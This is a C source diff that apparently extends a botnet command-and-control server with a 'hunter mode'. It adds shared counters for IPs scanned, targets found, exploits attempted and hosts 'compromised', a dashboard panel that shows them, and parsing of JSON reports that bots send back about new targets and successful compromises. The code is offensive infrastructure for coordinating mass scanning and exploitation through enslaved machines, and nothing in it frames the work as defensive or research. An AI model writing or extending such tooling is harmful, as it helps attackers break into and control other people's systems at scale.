@@ -91,6 +91,19 @@ typedef struct {
 
 Stats stats = {0};
 
+// Hunter Stats (global)
+typedef struct {
+    int total_scanned;
+    int targets_found;
+    int exploits_attempted;
+    int compromised;
+    time_t last_update;
+    char last_target[128];
+} HunterStats;
+
+HunterStats hunter_stats = {0};
+pthread_mutex_t hunter_mutex = PTHREAD_MUTEX_INITIALIZER;
+
 // Include hunter commands after structures are defined
 #include "hunter_commands.h"
 
@@ -279,6 +292,36 @@ void print_dashboard() {
     printf(BRIGHT_CYAN "🎯 Exploits Sent:" RESET " %-6d        ", stats.total_exploits);
     printf("│\n");
     printf(BRIGHT_YELLOW "└────────────────────────────────────────────────────────────────────────────┘\n" RESET);
+    
+    // Hunter stats panel
+    pthread_mutex_lock(&hunter_mutex);
+    if (hunter_stats.last_update > 0) {
+        int hunter_idle = now - hunter_stats.last_update;
+        const char *activity_color = hunter_idle < 10 ? BRIGHT_GREEN : BRIGHT_YELLOW;
+        
+        printf("\n");
+        printf(BRIGHT_RED "┌──────────────────────── " BRIGHT_WHITE "🎯 HUNTER MODE STATUS" BRIGHT_RED " ────────────────────────┐\n" RESET);
+        printf("│ " BRIGHT_MAGENTA "🔍 IPs Scanned:" RESET " %-8d  ", hunter_stats.total_scanned);
+        printf(BRIGHT_GREEN "🎯 Targets Found:" RESET " %-8d ", hunter_stats.targets_found);
+        printf("│\n");
+        printf("│ " BRIGHT_YELLOW "💥 Exploits Tried:" RESET " %-7d  ", hunter_stats.exploits_attempted);
+        printf(BRIGHT_CYAN "💀 Compromised:" RESET " %-10d ", hunter_stats.compromised);
+        printf("│\n");
+        
+        if (strlen(hunter_stats.last_target) > 0) {
+            printf("│ " BRIGHT_WHITE "Last Target:" RESET " %-55s │\n", hunter_stats.last_target);
+        }
+        
+        printf("│ " BRIGHT_WHITE "Activity:" RESET " %s%s%s", 
+               activity_color, 
+               hunter_idle < 5 ? "ACTIVE" : hunter_idle < 30 ? "SCANNING" : "IDLE",
+               RESET);
+        for (int i = 0; i < 53; i++) printf(" ");
+        printf("│\n");
+        
+        printf(BRIGHT_RED "└────────────────────────────────────────────────────────────────────────────┘\n" RESET);
+    }
+    pthread_mutex_unlock(&hunter_mutex);
     
     printf("\n");
     
@@ -577,6 +620,55 @@ void *handle_bot(void *arg) {
             bots[bot_index].last_seen = time(NULL);
         }
         pthread_mutex_unlock(&bots_mutex);
+        
+        // Procesar mensajes del bot
+        if (buffer[0] == '{') {
+            struct json_object *msg = json_tokener_parse(buffer);
+            if (msg) {
+                struct json_object *type_obj = NULL;
+                if (json_object_object_get_ex(msg, "type", &type_obj)) {
+                    const char *msg_type = json_object_get_string(type_obj);
+                    
+                    // Hunter reports
+                    if (strcmp(msg_type, "hunter_scan") == 0) {
+                        struct json_object *scanned_obj = NULL;
+                        if (json_object_object_get_ex(msg, "scanned", &scanned_obj)) {
+                            pthread_mutex_lock(&hunter_mutex);
+                            hunter_stats.total_scanned += json_object_get_int(scanned_obj);
+                            hunter_stats.last_update = time(NULL);
+                            pthread_mutex_unlock(&hunter_mutex);
+                        }
+                    } else if (strcmp(msg_type, "hunter_found") == 0) {
+                        struct json_object *target_obj = NULL;
+                        if (json_object_object_get_ex(msg, "target", &target_obj)) {
+                            const char *target = json_object_get_string(target_obj);
+                            pthread_mutex_lock(&hunter_mutex);
+                            hunter_stats.targets_found++;
+                            snprintf(hunter_stats.last_target, sizeof(hunter_stats.last_target), "%s", target);
+                            hunter_stats.last_update = time(NULL);
+                            pthread_mutex_unlock(&hunter_mutex);
+                            
+                            // Mostrar notificación en tiempo real
+                            printf("\n" BRIGHT_GREEN "[HUNTER] 🎯 %s found: %s" RESET "\n", 
+                                   bots[bot_index].id, target);
+                        }
+                    } else if (strcmp(msg_type, "hunter_success") == 0) {
+                        struct json_object *message_obj = NULL;
+                        if (json_object_object_get_ex(msg, "message", &message_obj)) {
+                            const char *msg_text = json_object_get_string(message_obj);
+                            pthread_mutex_lock(&hunter_mutex);
+                            hunter_stats.compromised++;
+                            hunter_stats.last_update = time(NULL);
+                            pthread_mutex_unlock(&hunter_mutex);
+                            
+                            printf("\n" BRIGHT_MAGENTA "[HUNTER] 💀 %s: %s" RESET "\n", 
+                                   bots[bot_index].id, msg_text);
+                        }
+                    }
+                }
+                json_object_put(msg);
+            }
+        }
     }
     
     remove_bot(bot_index);
